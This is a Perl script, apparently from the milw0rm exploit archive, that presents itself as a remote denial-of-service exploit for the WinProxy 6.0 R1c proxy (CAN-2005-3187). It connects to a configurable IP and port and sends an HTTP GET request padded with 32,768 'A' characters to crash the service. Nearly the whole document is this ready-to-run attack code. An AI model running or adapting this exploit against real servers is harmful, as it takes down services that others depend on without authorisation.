#!perl
#
# "WinProxy 6.0 R1c" Remote DoS Exploit
#
# Author:  FistFucker
# e-Mail:  FistFuXXer@gmx.de
#
#
# Advisory:
# http://www.idefense.com/intelligence/vulnerabilities/display.php?id=363
#
# CVE info:
# CAN-2005-3187
#

use IO::Socket;

#
# destination IP address
#
$ip = '127.0.0.1';

#
# destination TCP port
#
$port = 80;


print '"WinProxy 6.0 R1c" Remote DoS Exploit'."\n\n";

$sock = IO::Socket::INET->new
(

    PeerAddr => $ip,
    PeerPort => $port,
    Proto    => 'tcp',
    Timeout  => 2

) or print '[-] Error: Could not establish a connection to the server!' and exit(1);

print "[+] Connected.\n";

$sock->send('GET /'. 'A' x 32768 ." HTTP/1.1\r\n\r\n");

print "[+] DoS string has been sent.";

close($sock);

# milw0rm.com [2006-01-07]
